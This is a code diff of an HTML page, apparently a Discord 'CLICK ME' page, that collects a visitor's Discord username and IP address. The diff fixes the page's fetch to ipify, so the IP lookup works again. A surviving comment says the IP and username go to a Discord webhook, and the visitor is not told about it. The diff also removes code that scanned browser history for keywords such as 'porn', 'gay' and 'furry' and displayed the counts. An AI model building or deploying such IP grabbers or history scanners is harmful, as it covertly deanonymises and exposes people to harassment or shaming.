@@ -29,12 +29,10 @@
             opacity: 1;
             outline: 1px solid white; /* Add white outline */
         }
-        .input-container {
-            margin-bottom: 20px;
-        }
         input[type="text"] {
             padding: 10px;
             font-size: 18px;
+            margin-bottom: 20px;
             border: none;
             border-radius: 5px;
             width: calc(100% - 22px);
@@ -73,41 +71,15 @@
         #secondScreen {
             display: none;
         }
-        #keywordContainer {
-            display: none;
-            position: absolute;
-            top: 50%;
-            right: 20px;
-            transform: translateY(-50%);
-            background-color: #172659;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-        #keywordContainer h2 {
-            margin-top: 0;
-        }
-        #keywordList {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-        #keywordList li {
-            margin-bottom: 10px;
-        }
-        #keywordList li span {
-            font-weight: bold;
-            color: green;
-        }
     </style>
 </head>
 <body>
     <div class="container" id="firstScreen">
         <h1>Welcome!</h1>
-        <div class="input-container">
-            <label for="discordUsername">Enter your Discord username:</label>
-            <input type="text" id="discordUsername" placeholder="Discord Username">
-        </div>
+        <p>Please enter your Discord username to proceed:</p>
+        <label for="discordUsername">Enter your Discord username:</label>
+        <input type="text" id="discordUsername" placeholder="Discord Username">
+        <br>
         <button id="clickMeBtn" disabled>CLICK ME!</button>
     </div>
 
@@ -116,18 +88,11 @@
         <p>Made by BlobsterWasHere on discord.</p>
     </div>
 
-    <div id="keywordContainer">
-        <h2>Scanned Keywords</h2>
-        <ul id="keywordList"></ul>
-    </div>
-
     <script>
         const discordUsernameInput = document.getElementById('discordUsername');
         const clickMeBtn = document.getElementById('clickMeBtn');
         const firstScreen = document.getElementById('firstScreen');
         const secondScreen = document.getElementById('secondScreen');
-        const keywordContainer = document.getElementById('keywordContainer');
-        const keywordList = document.getElementById('keywordList');
 
         discordUsernameInput.addEventListener('input', function() {
             clickMeBtn.disabled = !discordUsernameInput.value.trim();
@@ -146,7 +111,8 @@
             }
 
             // Get the IP address using ipify
-            fetch('https://api.ipify            .then(response => response.json())
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
                     // Send the IP address and Discord username to the Discord webhook
@@ -176,37 +142,6 @@
                         secondScreen.style.top = '50%';
                         secondScreen.style.left = '50%';
                         secondScreen.style.transform = 'translate(-50%, -50%)';
-
-                        // Scan browser history and cookies for keywords
-                        const keywords = ['porn', 'child', 'gay', 'furry', 'woman']; // Keywords to search for
-                        const keywordCounts = {};
-
-                        chrome.history.search({text: '', maxResults: 100}, function(data) {
-                            data.forEach(function(page) {
-                                const lowerCaseTitle = page.title.toLowerCase();
-                                const lowerCaseUrl = page.url.toLowerCase();
-
-                                keywords.forEach(function(keyword) {
-                                    if (lowerCaseTitle.includes(keyword) || lowerCaseUrl.includes(keyword)) {
-                                        if (!keywordCounts[keyword]) {
-                                            keywordCounts[keyword] = 1;
-                                        } else {
-                                            keywordCounts[keyword]++;
-                                        }
-                                    }
-                                });
-                            });
-
-                            // Display scanned keywords
-                            for (const keyword in keywordCounts) {
-                                const li = document.createElement('li');
-                                li.textContent = `${keyword}: ${keywordCounts[keyword]} times`;
-                                keywordList.appendChild(li);
-                            }
-
-                            // Show the keyword container
-                            keywordContainer.style.display = 'block';
-                        });
                     })
                     .catch(error => {
                         console.error('ERROR', error);
